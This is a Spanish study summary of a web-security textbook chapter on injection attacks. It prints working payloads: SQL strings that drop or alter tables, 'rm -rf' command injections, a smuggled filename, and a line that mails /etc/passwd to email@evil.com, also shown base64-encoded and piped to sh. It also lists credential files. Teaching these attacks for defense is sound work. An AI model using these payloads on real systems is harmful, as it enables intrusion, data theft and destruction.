# Web Application Security (2nd Edition) — Andrew Hoffman (O'Reilly Media, 2024)
## Capítulo 13 — Injection (Inyección)

> Nota de extracción: el texto se obtuvo de la capa de texto del PDF; las citas indican la página del PDF.

## Lo que necesitas saber
El capítulo presenta los ataques de inyección (injection), de los cuales SQL injection es el caso más conocido, pero no el único. La tesis central es que todo ataque de inyección tiene dos componentes: un intérprete y un payload del usuario que llega a ese intérprete por falta de saneamiento. Por eso la inyección puede ocurrir contra bases de datos SQL, contra utilidades de línea de comandos (CLI) como FFMPEG, e incluso contra el sistema operativo anfitrión.

El autor distingue tres niveles de gravedad creciente: SQL injection, code injection (contra un intérprete o CLI) y command injection (contra el OS del servidor). Sales sabiendo cómo se forma y entrega un payload contra una API vulnerable, qué arquitectura de aplicación habilita cada ataque, y por qué command injection es de lo más peligroso: con acceso de superusuario sobre un OS Unix "podemos hacer lo que queramos con ese OS" (PDF p. 217).

Además se explican las técnicas de exfiltración de datos (in-band, out-of-band e inferencial/blind) y por qué las blocklists son una defensa pobre frente a las allowlists. El capítulo se centra en el ataque; las defensas detalladas se tratan en la Parte III.

## SQL Injection
Es la forma clásica de inyección: una cadena SQL se escapa dentro de un payload HTTP y se ejecutan queries personalizadas en nombre del usuario. Históricamente abundó en paquetes OSS hechos con PHP + MySQL, por la laxitud de PHP al mezclar vista, lógica y datos (SQL, HTML y PHP en un mismo archivo). Hasta WordPress cayó víctima de esto.

El riesgo viene de concatenar parámetros sin sanear. En un servidor Node.js/Express:

```javascript
const result = await sql.query('SELECT * FROM users WHERE USER = ' + user_id);
```

Variando `user_id` el atacante abusa de la query:

```javascript
const user_id = '1=1' // evaluación truthy: devuelve todos los usuarios
user_id = '123abc; DROP TABLE users;'; // borra la tabla
const user_id = '123abc; UPDATE users SET credits = 10000 WHERE user = 123abd;' // ataque sigiloso
```

Dato del capítulo: según la National Vulnerability Database, las vulnerabilidades de inyección bajaron de casi el 5% de todas las vulnerabilidades en 2010 a menos del 1% hoy, en parte por el declive del uso de PHP (índice TIOBE) y por estándares de codificación más estrictos.

## Code Injection
SQL injection es un subconjunto de la inyección de código. En code injection el script corre bajo un intérprete o CLI, no directamente contra el OS. Es menos común y peor documentado porque suele ser específico de la aplicación: casi toda app usa una base de datos, pero no todas exponen otros CLI/intérpretes controlables vía API.

Ejemplo con el servidor de compresión de MegaBank (`media.mega-bank.com`). El endpoint `uploadImage` usa la librería `imagemin`, que invoca un CLI (`imagemin-cli`); al no sanear el nombre de archivo, un usuario puede sobrescribir imágenes existentes (p. ej. `main_logo.png`). Como se invoca un CLI, cuenta como ataque de inyección.

Ejemplo más claro con un convertidor de vídeo que concatena opciones del usuario:

```javascript
const options = defaultOptions + req.body.options;
exec(`convert -d ${videoData} -n ${videoName} -o ${options}`);
```

El atacante inyecta comandos adicionales en el CLI:

```javascript
const options = '-c h264 -ab 192k \ convert -dir /videos -s 1x1';
```

Cómo inyectar comandos extra depende de la arquitectura del CLI: algunos aceptan varios comandos por línea, otros se rompen con saltos de línea, espacios o ampersands (`&&`). Si el CLI corre contra el OS anfitrión en lugar de en su propio entorno, deja de ser code injection y pasa a ser command injection.

## Command Injection
Es la forma elevada de code injection: en vez de actuar sobre un CLI/intérprete, se ejecutan comandos (normalmente Bash) contra el OS. El autor recuerda que "más del 95% de los servidores son Unix" (PDF p. 217), y escapar comillas permite salir del CLI y atacar el host:

```javascript
const options = "' && rm -rf /videos";
// resultado:
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720' && rm -rf /videos
```

Un OS comprometido da acceso a archivos y permisos críticos:
- `/etc/passwd` — cuentas de usuario del OS
- `/etc/shadow` — contraseñas cifradas
- `~/.ssh` — claves SSH
- `/etc/apache2/httpd.conf` — configuración de Apache
- `/etc/nginx/nginx.conf` — configuración de nginx

Posibles ataques derivados: robar datos, reescribir logs para borrar rastros, añadir un usuario de BD con escritura, borrar archivos o liquidar el servidor, abusar de integraciones (p. ej. claves de Sendgrid para spam), convertir un formulario de login en formulario de phishing, o bloquear a los admins y extorsionarlos.

Mitigación mencionada: el robusto sistema de permisos de Unix sobre archivos, directorios, usuarios y comandos puede reducir el daño forzando a la API a correr como usuario no privilegiado; pero la mayoría de apps vulnerables no configuran estos perfiles.

Otro ejemplo: un endpoint que al final borra el vídeo crudo concatenando el nombre sin sanear:

```javascript
exec(`rm /videos/raw/${req.body.name}`);
const name = 'myVideo.mp4 && rm -rf /videos/converted/';
```

## Injection Data Exfiltration Techniques
Los ejemplos son de SQL injection, pero las técnicas aplican a cualquier inyección. A veces el atacante explota la vulnerabilidad pero no recibe respuestas del servidor; las técnicas de exfiltración permiten saber el estado del ataque.

- In-Band: el caso más fácil y común. El resultado del payload se ve directamente en el navegador o en la respuesta HTTP; se usa el mismo canal para enviar el payload y ver resultados.
- Out-of-Band (OOB): cuando el resultado no se refleja. Se usan utilidades HTTP del motor SQL (`util_http`) para enviar los datos a un servidor del atacante (`https://evil.com`). Funciona en Oracle SQL Server, MySQL, PostgreSQL y Microsoft SQL Server; la sintaxis varía pero el flujo es similar.
- Inferencial / blind injection: cuando no sirven ni in-band ni OOB (permisos del intérprete limitados). No se obtienen respuestas, pero se fuerza al servidor a comportarse de forma errática. Método común: `WAITFOR DELAY`, que bloquea la ejecución según una condición:

```javascript
const payload = `user_id=1or1=WAITFOR DELAY '0:0:30'`;
```

Si la respuesta tarda más de 30 segundos (atípico en el 99.99% de queries), es muy probable que el payload tuviera éxito. Con lógica condicional (delay si verdadero, no delay si falso) se infiere información poco a poco.

## Bypassing Common Defenses
Las apps seguras usan prepared statements y stored procedures contra SQL injection, pero muchos CLI no-SQL carecen de estas defensas, así que los desarrolladores recurren a mitigaciones menos eficaces, en especial las blocklists, fáciles de evadir: a menudo se puede expresar la misma lógica de otra forma que el intérprete entienda igual.

Ejemplo: una blocklist bloquea el comando `mail`:

```
mail -s "leaked file" "email@evil.com" < /etc/passwd
```

Como las terminales Linux ejecutan varias codificaciones (incluida base64), se codifica el payload para evadir el filtro de texto plano:

```javascript
const b64 = btoa('mail -s "leaked file" "email@evil.com" < /etc/passwd');
```

```
base64 -D <<< bWFpbCAtcyAi...Pass==  | sh
```

Al pasar el filtro, la utilidad `base64` de la terminal lo decodifica y lo canaliza (pipe) hacia Bash. Es el ejemplo perfecto de por qué las blocklists son un mecanismo muy pobre comparado con las allowlists.

## Ideas clave
- Todo ataque de inyección requiere dos factores: un payload del usuario y un intérprete que lo ejecuta por falta de saneamiento.
- Tres niveles de gravedad creciente: SQL injection → code injection (intérprete/CLI) → command injection (OS anfitrión).
- Concatenar entradas del usuario en queries o comandos (en vez de parametrizar) es la causa raíz; nunca se debe confiar en que el input HTTP no fue alterado.
- Command injection expone todo el OS y encabeza las escalas de riesgo; los permisos de Unix solo mitigan parcialmente.
- La inyección no depende de una especificación débil (a diferencia de XXE), sino de confiar demasiado en las entradas del usuario.
- Exfiltración: in-band (resultado reflejado), out-of-band (vía `util_http` hacia servidor del atacante), inferencial/blind (vía `WAITFOR DELAY` y lógica condicional).
- Las blocklists se evaden fácilmente (p. ej. codificando el payload en base64); las allowlists, prepared statements y stored procedures son defensas superiores.
- Los ataques contra parsers y CLI poco comunes están menos documentados y suelen tener defensas más débiles que las bases de datos conocidas.
